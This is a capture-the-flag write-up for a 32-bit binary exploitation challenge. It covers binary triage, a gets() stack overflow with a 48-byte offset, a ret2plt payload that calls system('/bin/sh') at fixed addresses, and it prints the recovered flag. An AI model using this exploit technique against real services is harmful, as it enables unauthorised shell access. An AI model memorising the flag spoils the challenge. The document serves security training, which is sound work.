CHALLENGE DESCRIPTION:
----------------------
We've experienced a data breach! Our forensics team detected unusual network
activity originating from our new smart refrigerator. It turns out there's an
old debugging service still running on it. Now it’s your job to figure out how
the attackers gained access to the fridge!

Remote target:
- `nc chall.0xfun.org 10806`

Flag format hint:
- `0xfun{}`

FILES PROVIDED:
--------------
- vuln

SOLUTION:
---------

1. INITIAL RECONNAISSANCE
   
   Started with basic ELF triage:
   - `file vuln` -> 32-bit dynamically linked ELF
   - `checksec` -> Partial RELRO, No Canary, NX enabled, No PIE
   - `strings/objdump` -> menu-driven program with a "set welcome message" path

2. FIND THE VULNERABLE FUNCTION
   
   Option `2` calls `set_welcome_message()`.
   That function reads user input with:
   - `gets(buffer)`
   
   `gets()` has no bounds check, so it allows a stack overflow and EIP control.

3. CONFIRM OFFSET TO RETURN ADDRESS
   
   From disassembly:
   - local buffer is at `[ebp-0x2c]`
   - function epilogue restores saved registers and returns
   
   Practical overwrite distance to saved return address is:
   - `48` bytes

4. CHOOSE EXPLOIT STRATEGY
   
   With NX enabled, direct shellcode injection is not reliable.
   Since PIE is disabled, addresses in the binary are fixed, so ret2libc/ret2plt
   is straightforward.

   Useful fixed addresses in this binary:
   - `system@plt` = `0x080490a0`
   - `exit@plt`   = `0x080490b0`
   - `"/bin/sh"`  = `0x0804a09a`

5. BUILD THE PAYLOAD
   
   Payload layout:
   - `b"A" * 48`
   - `p32(system@plt)`
   - `p32(exit@plt)`      (return after system)
   - `p32(binsh_addr)`    (argument to system)
   
   Final form:
   - `payload = b"A"*48 + p32(0x080490a0) + p32(0x080490b0) + p32(0x0804a09a)`

6. TRIGGER AND GET SHELL
   
   Exploit flow:
   - connect to remote service
   - choose menu option `2`
   - send overflow payload as welcome message
   - process returns into `system("/bin/sh")`

7. READ THE FLAG
   
   After shell:
   - `cat flag.txt`

8. VERIFY
   
   The remote service returns:
   - `0xfun{4_ch1ll1ng_d1sc0v3ry!p1x3l_b3at_r3v3l4t1ons_c0d3x_b1n4ry_s0rcery_unl3@sh3d!}`
